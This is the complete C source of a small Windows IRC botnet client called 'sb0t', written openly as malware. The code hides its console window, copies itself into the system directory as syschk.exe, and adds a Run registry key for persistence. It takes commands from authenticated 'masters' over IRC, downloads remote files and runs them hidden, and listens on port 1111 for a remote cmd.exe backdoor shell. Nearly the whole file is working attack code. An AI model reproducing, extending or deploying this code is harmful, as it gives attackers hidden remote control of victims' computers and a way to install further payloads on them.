#include <windows.h>
#include <winsock.h> 
#include <stdio.h>
//#include <small.h>
//if u r compiling with msvc 6.0 include "small.h"

//consts
#define b_host       "localhost"
#define b_port        6667

#define b_Nick       "sb0t"
#define b_chan       "#b0t"
#define b_cpass      "nireb"
#define b_bpass      "nireb"

#define cmd_prefix   '.'
#define cmd_login    "login"
#define cmd_logout   "logout"
#define cmd_msg      "msg"
#define cmd_raw      "raw"
#define cmd_bdoor    "info"
#define bport         1111
#define cmd_download "download"
#define cmd_quit     "die"

#define bdpass       "nireb"
#define bdmess       "Type your password:"
#define maxlog        5

#define sleept		  12 * 1000
#define mtx			  "sb0t"
#define regval        "small b0t"
#define sname		  "\\syschk.exe"

//functions
 typedef HANDLE   (__stdcall *CM)(LPSECURITY_ATTRIBUTES,BOOL,LPCTSTR); 
 // CreateMutex
 typedef DWORD    (__stdcall *GT)(void);
 //GetLastError
 typedef int      (__stdcall *WI)(LPTSTR,LPCTSTR,...);
 //wsprintf
 typedef HWND	  (__stdcall *FW)(LPCTSTR,LPCTSTR);
 //FindWindow
 typedef BOOL	  (__stdcall *SW)(HWND,int);
 //ShowWindow
 typedef void     (__stdcall *EP)(UINT);  
 //ExitProcess
 typedef void     (__stdcall *SP)(DWORD);
 //Sleep
 typedef LPTSTR   (__stdcall *SC)(LPTSTR,LPCTSTR);
 //lstrcat
 typedef int      (__stdcall *SI)(LPCTSTR,LPCTSTR);
 //lstrcmpi
 typedef LPTSTR   (__stdcall *SY)(LPTSTR,LPCTSTR);
 //lstrcpy
 typedef LPTSTR   (__stdcall *NN)(LPTSTR,LPCTSTR,int);
 //lstrcpyn
 typedef int      (__stdcall *SN)(LPCTSTR);
 //lstrlen
 typedef HANDLE   (__stdcall *CT)(LPSECURITY_ATTRIBUTES,DWORD,
								  LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
 //CreateThread
 typedef void     (__stdcall *EX)(DWORD);
 //ExitThread
 typedef BOOL     (__stdcall *CP)(PHANDLE,PHANDLE,LPSECURITY_ATTRIBUTES,DWORD);
 //CreatePipe
 typedef VOID     (__stdcall *GS)(LPSTARTUPINFO);
 //GetStartupInfo
 typedef BOOL     (__stdcall *CO)(LPCTSTR,LPTSTR,LPSECURITY_ATTRIBUTES,
								  LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,
								  LPCTSTR,LPSTARTUPINFO,LPPROCESS_INFORMATION);
 //CreateProcess
 typedef BOOL     (__stdcall *GP)(HANDLE,LPDWORD);
 //GetExitCodeProcess
 typedef BOOL     (__stdcall *PP)(HANDLE,LPVOID,DWORD,LPDWORD,LPDWORD,LPDWORD);
 //PeekNamedPipe
 typedef BOOL     (__stdcall *RF)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
 //ReadFile
 typedef BOOL     (__stdcall *IF)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
 //WriteFile
 typedef BOOL     (__stdcall *CH)(HANDLE);
 //CloseHandle
 typedef UINT     (__stdcall *GY)(LPTSTR,UINT);
 //GetSystemDirectory
 typedef BOOL	  (__stdcall *CF)(LPCTSTR,LPCTSTR,BOOL);
 //CopyFile
  typedef HMODULE  (__stdcall *GH)(LPCTSTR); 
 //GetModuleHandle
 typedef DWORD    (__stdcall *GF)(HMODULE,LPTSTR,DWORD); 
 //fGetModuleFileN
 typedef SOCKET   (__stdcall *WA)(SOCKET,struct sockaddr FAR*,int FAR*);
 //accept
 typedef int      (__stdcall *WB)(SOCKET,const struct sockaddr FAR*,int);
 //bind
 typedef int      (__stdcall *WC)(SOCKET);
 //closesocket
 typedef int      (__stdcall *WN)(SOCKET,const struct sockaddr FAR*,int);
 //connect
 typedef u_short  (__stdcall *WH)(u_short);
 //htons
 typedef int      (__stdcall *WL)(SOCKET,int);
 //listen
 typedef int      (__stdcall *WR)(SOCKET,char FAR*,int,int);
 //recv
 typedef int      (__stdcall *WS)(SOCKET,const char FAR *,int,int);
 //send
 typedef SOCKET   (__stdcall *WT)(int,int,int);
 //socket
 typedef struct 
	hostent FAR * (__stdcall *GN)(const char FAR *);
 //gethostbyname
 typedef int      (__stdcall *WU)(SOCKET,HWND,unsigned int,long);
 //WSAAsyncSelect
 typedef int      (__stdcall *WP)(void);
 //WSACleanup
 typedef int      (__stdcall *WZ)(WORD,LPWSADATA);
 //WSAStartup
 typedef int      (__stdcall *GA)(SOCKET,struct sockaddr FAR*,int FAR*);
 //getsockname
 typedef HRESULT (__stdcall *UD)(LPUNKNOWN,LPCWSTR,LPCTSTR,DWORD,
								 LPBINDSTATUSCALLBACK);
 //URLDownloadToFile
 typedef HINSTANCE(__stdcall *SE)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,INT);
 //ShellExecute
 typedef LONG     (__stdcall *RK)(HKEY,LPCTSTR,PHKEY); 
 //RegCreateKey
 typedef LONG     (__stdcall *RS)(HKEY,LPCTSTR,DWORD,DWORD,LPCTSTR,DWORD);
 //RegSetValueEx
 typedef LONG     (__stdcall *RC)(HKEY); 
 //fRegCloseKey
 typedef LONG     (__stdcall *RO)(HKEY,LPSTR,DWORD,REGSAM,PHKEY); 
 //fRegOpenKeyEx
 typedef LONG     (__stdcall *RQ)(HKEY,LPSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD); 
 //fRegQueryValueEx;

 //declare functions
 WI fwsprintf;
 FW fFindWindow;
 SW fShowWindow;

 CM fCreateMutex;
 GT fGetLastError;
 EP fExitProcess;
 SP fSleep;
 SC fstrcat;
 SI fstrcmp;
 SY fstrcpy;
 NN fstrcpyn;
 SN fstrlen;
 CT fCreateThread;
 EX fExitThread;
 CP fCreatePipe;
 GS fGetStartupInfo;
 CO fCreateProcess;
 GP fGetExitCodeProc;
 PP fPeekNamedPipe;
 RF fReadFile;
 IF fWriteFile;
 CH fCloseHandle;
 GY fGetSystemDir;
 CF fCopyFile;
 CF fCopyFile;
 GH fGetModuleHandle;
 GF fGetModuleFileN;

 WA faccept;
 WB fbind;
 WC fclosesocket;
 WN fconnect;
 WH fhtons;
 WL flisten;
 WR frecv;
 WS fsend;
 WT fsocket;
 GN fgethostbyname;
 WU fWSAAsyncSelect;
 WP fWSACleanup;
 WZ fWSAStartup;
 GA fgetsockname;

 UD fURLDownloadToF;

 SE fShellExecute;
 
 RK fRegCreateKey;
 RS fRegSetValueEx;
 RC fRegCloseKey;
 RO fRegOpenKeyEx;
 RQ fRegQueryValueEx;

 char masters[maxlog][16] = {0};
 int x;
 int sock;

 char who      [64];
 char bufferin [512]; 
 char bufferout[512]; 
 char IP[] = "000.000.000.000";

 SOCKET locsock,remsock;  
 SOCKADDR_IN sinloc; 

 SECURITY_ATTRIBUTES secat; 

 typedef struct down_struct //download struct
 {
  char whois[16];
  char web  [128];
  char dfile[128];
  BOOL run;
 }down;

 down downs; //declare downs

 //Functions protoypes

 void CheckStr(char*);
 void AddMaster(char*);
 void DeleteMaster(char*,BOOL);
 BOOL CheckMaster(char*);
 void Privmsg(SOCKET,char*,char*);
 DWORD WINAPI Backdoor(LPVOID param); //backdoor is coded by White Scorpion
 void CommandPrompt(void);
 DWORD WINAPI Download(LPVOID param);
 char *xstrchr(const char*,char);
 char rot13c(char);
 void rot13(char*, const char*);

int main()
{
 HINSTANCE user32;
 HINSTANCE kernel32;
 HINSTANCE wsock;
 HINSTANCE urlmon;
 HINSTANCE shell32;
 HINSTANCE advapi32;

 WSADATA wsa;
 SOCKADDR sa;
 struct hostent *he;
 struct sockaddr_in sin;

 int sas;
 int valid;

 char buffer [512];
 char sbuff  [512];
 char command[32];
 char sysdir [MAX_PATH];
 char sfile	 [MAX_PATH];
 char **part = NULL;

 int i,j,z;

 DWORD id;

 HKEY hKey;
  
  //load libraries
  user32   = LoadLibrary("user32.dll");
  kernel32 = LoadLibrary("kernel32.dll");
  wsock    = LoadLibrary("ws2_32.dll");
  urlmon   = LoadLibrary("urlmon.dll");
  shell32  = LoadLibrary("shell32.dll");
  advapi32 = LoadLibrary("advapi32.dll");

  //Get needed Apis
  fwsprintf        = (WI)GetProcAddress(user32  ,"wsprintfA");
  fFindWindow      = (FW)GetProcAddress(user32  ,"FindWindowA");
  fShowWindow	   = (SW)GetProcAddress(user32  ,"ShowWindow");

  fCreateMutex     = (CM)GetProcAddress(kernel32,"CreateMutexA");
  fGetLastError    = (GT)GetProcAddress(kernel32,"GetLastError");
  fExitProcess     = (EP)GetProcAddress(kernel32,"ExitProcess");
  fstrcat          = (SC)GetProcAddress(kernel32,"lstrcatA");
  fstrcmp          = (SI)GetProcAddress(kernel32,"lstrcmpiA");
  fstrcpy          = (SY)GetProcAddress(kernel32,"lstrcpyA");
  fstrcpyn         = (NN)GetProcAddress(kernel32,"lstrcpynA");
  fstrlen          = (SN)GetProcAddress(kernel32,"lstrlenA");
  fCreateThread    = (CT)GetProcAddress(kernel32,"CreateThread");
  fExitThread      = (EX)GetProcAddress(kernel32,"ExitThread");
  fCreatePipe      = (CP)GetProcAddress(kernel32,"CreatePipe");
  fGetStartupInfo  = (GS)GetProcAddress(kernel32,"GetStartupInfoA");
  fCreateProcess   = (CO)GetProcAddress(kernel32,"CreateProcessA");
  fGetExitCodeProc = (GP)GetProcAddress(kernel32,"GetExitCodeProcess");
  fPeekNamedPipe   = (PP)GetProcAddress(kernel32,"PeekNamedPipe");
  fReadFile        = (RF)GetProcAddress(kernel32,"ReadFile");
  fWriteFile       = (IF)GetProcAddress(kernel32,"WriteFile");
  fCloseHandle     = (CH)GetProcAddress(kernel32,"CloseHandle");
  fSleep           = (SP)GetProcAddress(kernel32,"Sleep");
  fGetSystemDir    = (GY)GetProcAddress(kernel32,"GetSystemDirectoryA");
  fCopyFile		   = (CF)GetProcAddress(kernel32,"CopyFileA");
  fGetModuleHandle = (GH)GetProcAddress(kernel32,"GetModuleHandleA");
  fGetModuleFileN  = (GF)GetProcAddress(kernel32,"GetModuleFileNameA");

  faccept          = (WA)GetProcAddress(wsock   ,"accept");
  fbind            = (WB)GetProcAddress(wsock   ,"bind");
  fclosesocket     = (WC)GetProcAddress(wsock   ,"closesocket");
  fconnect         = (WN)GetProcAddress(wsock   ,"connect");
  fhtons           = (WH)GetProcAddress(wsock   ,"htons");
  flisten          = (WL)GetProcAddress(wsock   ,"listen");
  frecv            = (WR)GetProcAddress(wsock   ,"recv");
  fsend            = (WS)GetProcAddress(wsock   ,"send");
  fsocket          = (WT)GetProcAddress(wsock   ,"socket");
  fgethostbyname   = (GN)GetProcAddress(wsock   ,"gethostbyname");
  fWSAAsyncSelect  = (WU)GetProcAddress(wsock   ,"WSAAsyncSelect");
  fWSACleanup      = (WP)GetProcAddress(wsock   ,"WSACleanup");
  fWSAStartup      = (WZ)GetProcAddress(wsock   ,"WSAStartup");
  fgetsockname     = (GA)GetProcAddress(wsock   ,"getsockname");

  fRegCreateKey    = (RK)GetProcAddress(advapi32,"RegCreateKeyA");
  fRegSetValueEx   = (RS)GetProcAddress(advapi32,"RegSetValueExA");
  fRegCloseKey     = (RC)GetProcAddress(advapi32,"RegCloseKey");
  fRegOpenKeyEx    = (RO)GetProcAddress(advapi32,"RegOpenKeyExA");
  fRegQueryValueEx = (RQ)GetProcAddress(advapi32,"RegQueryValueExA");

  fURLDownloadToF  = (UD)GetProcAddress(urlmon  ,"URLDownloadToFileA");
  fShellExecute    = (SE)GetProcAddress(shell32 ,"ShellExecuteA");
  
  //Hide Console Window
  fShowWindow(fFindWindow("ConsoleWindowClass",NULL),0);

  //CreateMutex
  fCreateMutex(0, FALSE, mtx);

  //If sb0t is running exit
  if(fGetLastError() == ERROR_ALREADY_EXISTS)fExitProcess(0);

  //GetSystemDirectory + name
  fGetSystemDir(sysdir,sizeof(sysdir));
  fstrcat(sysdir,sname);

  //GetCurrentPath
  fGetModuleFileN(fGetModuleHandle(NULL), sfile, sizeof(sfile));
  
  //Software\\Microsoft\\Windows\\CurrentVersion\\Run
  rot13(sbuff,"Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha");
 
  //AutoStartUp
  if(fRegCreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey) == ERROR_SUCCESS)
  {
   fRegSetValueEx(hKey,regval,0,REG_SZ,sysdir,sizeof(sysdir));
   fRegCloseKey(hKey);
  }
  //Check if current path is same as sysdir + sname
  //If its isnt copy itslef to sysdir and run that copy
  if(fstrcmp(sfile,sysdir))
  {
   fCopyFile(sfile,sysdir,FALSE);
   fShellExecute(0, "open",sysdir, NULL, NULL, SW_HIDE);
   fExitProcess(0);
  }

  //Initialize winsock library
  fWSAStartup(MAKEWORD(1,1),&wsa);

  //CreateSocket
  sock=fsocket(AF_INET,SOCK_STREAM,0);

  //Get server ip
  he=fgethostbyname((char*)b_host);

  //If cant get server ip loop & sleep
  while(!he)fSleep(sleept);

  //fill structure
  sin.sin_family=AF_INET; // TCP
  sin.sin_port=fhtons(b_port); //port 
  sin.sin_addr.s_addr=**(unsigned int **)he->h_addr_list; //ip

  //if cant connect loop + sleep
  while(fconnect(sock,(struct sockaddr*)&sin,sizeof sin))fSleep(sleept);
  
  //copy nick and user to sbuff
  fwsprintf(sbuff,"NICK %s\nUSER [sb0t] \"[sb0t]\" \"sb0t\" :%s\n",b_Nick,b_host);
  
  //send sbuff
  fsend(sock,(char*)sbuff,sizeof(sbuff),0);

  //Create BackDoor thread
  fCreateThread(0, 0, &Backdoor, 0, 0, &id);
  
  //Get local ip address
  sas = sizeof(sa);
  fgetsockname(sock,&sa,&sas);
  memset(IP,0,sizeof(IP));
  fwsprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

  //loop 4ever
  while(1)
  {
   j = 0; 
   z = 0;
   
   //Zero buffer
   memset(buffer,0,sizeof(buffer));
   
   //allocate 4 bytes
   part = (char**)malloc(sizeof(char*));

   //get data from server
   valid=frecv(sock,&buffer[1],sizeof(buffer),0); //&buffer[1] - guess why :)
  
   //if something goes wrong break
   if (valid<=0) break;

   //parse data
   for(i = 0;i < valid;i++)
   {
	//remove '\r' & ':' chars
    if(buffer[i] == '\r'||buffer[i] == ':' && j <= 3)
       fstrcpy(&buffer[i],&buffer[i+1]);

	//split data in words if bot find '\n or ' ' chars
    if(buffer[i] == ' ' || buffer[i] == '\n')
    {
	 //reallocate part
     part = (char**)realloc(part,(j+1) * sizeof(char*));
	 //replace ' ' or '\n' with '\0'
     buffer[i] = '\0';
	 //point to buffer
     part[j] = &buffer[z+1]; //+1 becose it must jump over '\0'
     
	 z = i; //remeber position where bot find ' ','\n' chars
     j++;  //j = j + 1 :)
    }
   }
   j--;
   
   //who sends us a message
   for(i = 0;(UINT)i < strlen(part[0]) && part[0][i] != '!';i++);
      fstrcpyn(who,part[0],i+1);

	//search for PING and if bot find it send PONG + number
   for(i = 0;i < j;i++)
   {
    if(!fstrcmp(part[i],"PING"))

      fwsprintf(sbuff,"PONG %s",part[i+1]);

    if(!fstrcmp(part[i],"376") || !fstrcmp(part[i],"422"))

      fwsprintf(sbuff,"JOIN %s %s",b_chan,b_cpass);
   }
  
   if(j >= 3)
   {
    if(part[3][0] == cmd_prefix) //Check if the first char is our prefix
    {
 	 fstrcpy(command,&part[3][1]); //copy to command

	 if(!CheckMaster(who)) //This isnt my master
	 {
      if(!fstrcmp(command,(char*)cmd_login)) //check if it is login command
	    if(!fstrcmp(part[4],(char*)b_bpass)) //check pass
		{
         AddMaster(who); //if it is true add him/her to master
	 	 Privmsg(sock,who,"Password accepted"); //send him/her a message
		}
	 } 

 	 if(CheckMaster(who))  //This is my master
	 {
      if(!fstrcmp(command,(char*)cmd_logout)) //check if it is logout command
	  {
        DeleteMaster(who,FALSE); //Remove Master
	    Privmsg(sock,who,"You are removed from master list"); //send message
	  }

	  if(!fstrcmp(command,(char*)cmd_raw)) //raw command
	  {
	   memset(sbuff,0,sizeof(sbuff)); //zero buffer

	   if(j >= 5) //if it has at least 5 parts(words)
	     for(i = 4;i < j+1;i++) //go from 4th word
		 {						//and copy it to sbuff
		  fstrcat(sbuff,part[i]); 
		  fstrcat(sbuff," ");  //need " " between commands
		 }
	  }

	 if(!fstrcmp(command,(char*)cmd_msg)) //msg command
	 {
	  if(j >= 5) //check if it has at least 5 parts(words)
	  {
	    for(i = 5;i < j+1;i++) //go from 5th word
		{
		 fstrcat(sbuff,part[i]); //and copy it to sbuff
		 fstrcat(sbuff," ");//need " " between mess
		}
	  fwsprintf(bufferin,"\r\nPRIVMSG %s :%s\r\n",part[4],sbuff); 
	  //copy all to bufferin and send it to server
	  fsend(sock,bufferin,sizeof(buffer),0);
	  }
	 }
    
     if(!fstrcmp(command,(char*)cmd_bdoor)) //info command
     {
	  fwsprintf(bufferin,"Connect to ip: %s port:%d",IP,bport); //send message 
	  Privmsg(sock,who,bufferin);		//with victims ip and backdoor port
     }

	 if(!fstrcmp(command,(char*)cmd_quit)) //quit command
	 {
	  fExitProcess(0); //Exit
	 }

	 if(!fstrcmp(command,(char*)cmd_download)) //download command
	 {
	  if(j < 6)continue; //check if it has 6 parts(words)

	  fstrcpy(downs.web,part[4]); //copy part[4] to downs.web
	  fstrcpy(downs.dfile,part[5]);//copy part[5] to downs.dfile
	  
	  if(!fstrcmp(part[6],"t") || !fstrcmp(part[6],"true"))//Run file?
	    downs.run = TRUE;
	  
	  fCreateThread(0, 0, &Download, 0, 0, &id); //Create Download thread
	 }
	}
   }
  }   

   if(fstrlen(sbuff) > 5) //if sbuff is bigger than 5 chars
   {
    fwsprintf(buffer,"\r\n%s\r\n",sbuff); //copy sbuff to buffer
    fsend(sock,buffer,sizeof(buffer),0); //send buffer
    memset(sbuff,'\0',sizeof(buffer));  //zero buffer
   }

   free(part); //free allocated memory
   }
  
  //Free Libraries

  FreeLibrary(user32); 
  FreeLibrary(kernel32);
  FreeLibrary(wsock);
  FreeLibrary(urlmon);

  return 0;
}
//AddMaster Function 
void AddMaster(char *who)
{
  if(!CheckMaster(who)) //Check if is it allready logged
  {
   for(x = 0;x < maxlog;x++) 
     if(!masters[x][0]) //Search for zero array
	   fstrcpy(masters[x],who); //copy who to master[zero array]
  }
}
//CheckMaster Function 
BOOL CheckMaster(char *who) 
{
  for(x = 0;x < maxlog;x++)
    if(!fstrcmp(masters[x],who)) //If bot find master
	  return TRUE; //return TRUE
	  return FALSE; //else return FALSE
}
//DeleteMaster Function 
void DeleteMaster(char *who,BOOL All)
{
  if(All) //DeleteAll
    for(x = 0;x < maxlog;x++)
	  memset(masters[x],(int)'\0',sizeof(masters[x])); //Zero array

  for(x = 0; x < maxlog;x++) 
    //if(!fstrcmp(masters[x],who))
	if(CheckMaster(who)) //If bot find master
	  memset(masters[x],'\0',sizeof(masters[x])); //delete master(zero array)
}	
//Privmsg Function 
void Privmsg(SOCKET sock,char *who,char *mess)
{
  char buff[128]; //beware of buffer overflow :)

  fwsprintf(buff,"\r\nPRIVMSG %s :%s\r\n",who,mess); //copy to buff who + message
  fsend(sock,buff,sizeof(buff),0); //send buff
}
//Backdoor Function
//I take this from White Scorpion
//I change some stuffs in these 2 functions
//and sometimes when u type some command
//you will get that message that command
//doesent exists
//Type again that command and it will work
DWORD WINAPI Backdoor(LPVOID param)
{
 WSADATA wsadata; 
  
  //Initialize wsa
  fWSAStartup(0x101,&wsadata);
  //CreateSocket
  locsock=fsocket(AF_INET,SOCK_STREAM,0);
  
  //Fill structure
  sinloc.sin_family=AF_INET; //TCP 
  sinloc.sin_addr.s_addr=INADDR_ANY; //bot accept any IP
  sinloc.sin_port=fhtons((short)bport); //port
  
  //bind socket to port(1111)
  if(fbind(locsock,(SOCKADDR*)&sinloc,sizeof(SOCKADDR_IN))==SOCKET_ERROR) //
  {//if something goes wrong ExitThread
    fWSACleanup();
    fExitThread(1);
  }
  
  if(flisten(locsock,1)==SOCKET_ERROR)
  {//if something goes wrong ExitThread
    fWSACleanup();
    fExitThread(1);
  }
  
  while(1) //loop forever
  {
   remsock=SOCKET_ERROR;
   
   while(remsock==SOCKET_ERROR) //loop while remsock = SOCKET_ERROR
   {
    remsock=faccept(locsock,NULL,NULL); //if someones connect accept connection
    
	if(remsock==INVALID_SOCKET) //something wrong
	{
     fWSACleanup();
     fExitThread(1);
	}
   }

    fsend(remsock,bdmess,sizeof(bdmess),0); //send welcome message
    frecv(remsock,bufferin,sizeof(bufferin),0); //recieve data from client
	
	bufferin[strlen(bufferin)] = '\0';

    if(strcmp(bufferin,bdpass)) //if bot have got bad password closesocket
      fsend(remsock,"\nAccess Denied.\n",17,0);
    else
      CommandPrompt(); //call CommandPrompt

      fclosesocket(remsock); //closesocket
  }
  fExitThread(0);
    
}
//CommandPrompt function
void CommandPrompt(void) 
{
 DWORD bytesW,bytesRead,avail,exitcode;
 HANDLE newstdin,newstdout,readout,writein; 
 PROCESS_INFORMATION procinfo; 
 STARTUPINFO startinfo;
  
  char quit [] = "exit"; 
  char exit1[] = {'e','x','i','t','\n'}; 

  secat.nLength=sizeof(SECURITY_ATTRIBUTES);
  secat.bInheritHandle=TRUE;

  //create the pipes for our command prompt
  fCreatePipe(&newstdin,&writein,&secat,0);
  fCreatePipe(&readout,&newstdout,&secat,0);
   
  fGetStartupInfo(&startinfo);

  //fill another structure
  startinfo.dwFlags=STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  startinfo.wShowWindow=SW_HIDE;
  startinfo.hStdOutput=newstdout;
  startinfo.hStdError=newstdout;
  startinfo.hStdInput=newstdin;
  //run cmd
  fCreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NEW_CONSOLE,NULL,NULL,&startinfo,&procinfo);

  while(1) //loop 
  {
   fGetExitCodeProc(procinfo.hProcess,&exitcode);

   if(exitcode != STILL_ACTIVE)break;

   bytesRead=0;
   //sleep
   fSleep(500);
   
   //check if the pipe already contains something we can write to output
   if(!fPeekNamedPipe(readout,bufferout,sizeof(bufferout),&bytesRead,&avail,NULL))goto closeup;
   
   if(bytesRead)
   {
    while(bytesRead)
	{   
     //read data from cmd.exe and send to client, then clear the buffer
     fReadFile(readout,bufferout,sizeof(bufferout),&bytesRead,NULL);
     fsend(remsock,bufferout,strlen(bufferout),0);
     memset(bufferout,'\0',sizeof(bufferout));  
     fSleep(100); //sleep
     if(!fPeekNamedPipe(readout,bufferout,sizeof(bufferout),&bytesRead,&avail,NULL))break;
	}
   }
   //clear bufferin
   memset(bufferin,'\0',sizeof(bufferin));  

   if(frecv(remsock,bufferin,sizeof(bufferin),0) == SOCKET_ERROR)break;
   
   bufferin[strlen(bufferin)] = '\0'; //put '\0' at end of bufferin
   
   if(!fstrcmp(bufferin,quit))break; //if we got quit command then break
   
   fWriteFile(writein,bufferin,strlen(bufferin),&bytesW,NULL);
   
   memset(bufferin,'\0',sizeof(bufferin));
  }
  closeup:
   //close up all handles 
   WriteFile(writein,exit1,sizeof(exit1),&bytesW,NULL);
   CloseHandle(procinfo.hThread);
   CloseHandle(procinfo.hProcess);
   CloseHandle(newstdin);
   CloseHandle(writein);
   CloseHandle(readout);
   CloseHandle(newstdout);
}

//Download function
DWORD WINAPI Download(LPVOID param)
{
  fstrcpy(downs.whois,who); //copy who send us a command

  if(fURLDownloadToF(0,(const USHORT*)downs.web,downs.dfile,  0, 0) == S_OK)
  {//try to download
   if(downs.run) //if downs.run = TRUE
     fShellExecute(NULL,"open",downs.dfile,NULL,NULL,SW_HIDE);
	 //run file
     //this file must be (*.exe,*.pif,*.scr)
     //I didnt use CreateProcess API becose this function is 
     //quite simple and i try to code small bot :)
   Privmsg(sock,downs.whois,"Downloading..."); //send mesage
  }
  else Privmsg(sock,downs.whois,"Cant Download File"); //send error message

	fExitThread(0); //ExitThread
	return 0; //:P
}

//Taken from Mydoom :)
char *xstrchr(const char *str, char ch)
{
  while (*str && *str != ch) str++;
  return (*str == ch) ? (char *)str : NULL;
}

char rot13c(char c)
{
 char u[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
 char l[] = "abcdefghijklmnopqrstuvwxyz";
 char *p;

  if ((p = (char*)xstrchr(u, c)) != NULL)
    return u[((p-u) + 13) % 26];
  else if ((p = (char*)xstrchr(l, c)) != NULL)
    return l[((p-l) + 13) % 26];
  else
    return c;
}

void rot13(char *buf, const char *in)
{	
  while (*in)
    *buf++ = rot13c(*in++);
  *buf = 0;
}
//Sorry for bad English and some bugs that you find